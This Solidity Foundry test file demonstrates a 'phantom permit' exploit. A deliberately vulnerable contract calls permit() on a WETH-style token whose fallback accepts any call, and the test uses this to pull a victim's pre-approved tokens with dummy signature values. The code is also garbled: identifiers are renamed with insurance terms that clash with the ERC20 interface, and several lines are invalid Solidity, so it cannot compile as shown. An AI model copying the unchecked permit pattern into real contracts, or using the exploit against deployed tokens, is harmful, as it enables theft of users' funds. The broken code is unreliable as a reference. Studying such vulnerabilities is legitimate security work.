pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    PermitHealthtoken VulnPermitContract;
    WETH9 WETH9Contract;

    function setUp() public {
        WETH9Contract = new WETH9();
        VulnPermitContract = new PermitHealthtoken(IERC20(address(WETH9Contract)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.startPrank(alice);
        WETH9Contract.payPremium{value: 10 ether}();
        WETH9Contract.permitPayout(address(VulnPermitContract), type(uint256).max);
        vm.stopPrank();
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.creditsOf(address(this))
        );

        VulnPermitContract.depositbenefitWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = WETH9Contract.creditsOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitContract.accessBenefit(1000);

        wbal = WETH9Contract.creditsOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitHealthtoken {
    IERC20 public healthToken;

    constructor(IERC20 _medicalcredit) {
        healthToken = _medicalcredit;
    }

    function payPremium(uint256 amount) public {
        require(
            healthToken.transferbenefitFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
    }

    function depositbenefitWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(healthToken).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, "Permit failed");

        require(
            healthToken.transferbenefitFrom(target, address(this), amount),
            "Transfer failed"
        );
    }

    function accessBenefit(uint256 amount) public {
        require(healthToken.transferBenefit(msg.sender, amount), "Transfer failed");
    }
}


contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event AssignCredit(address indexed src, address indexed dst, uint wad);
    event AddCoverage(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public creditsOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        payPremium();
    }

    receive() external payable {}

    function payPremium() public payable {
        creditsOf[msg.sender] += msg.value;
        emit AddCoverage(msg.sender, msg.value);
    }

    function accessBenefit(uint wad) public {
        require(creditsOf[msg.sender] >= wad);
        creditsOf[msg.sender] -= wad;
        payable(msg.sender).transferBenefit(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function reserveTotal() public view returns (uint) {
        return address(this).credits;
    }

    function permitPayout(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transferBenefit(address dst, uint wad) public returns (bool) {
        return transferbenefitFrom(msg.sender, dst, wad);
    }

    function transferbenefitFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(creditsOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        creditsOf[src] -= wad;
        creditsOf[dst] += wad;

        emit AssignCredit(src, dst, wad);

        return true;
    }
}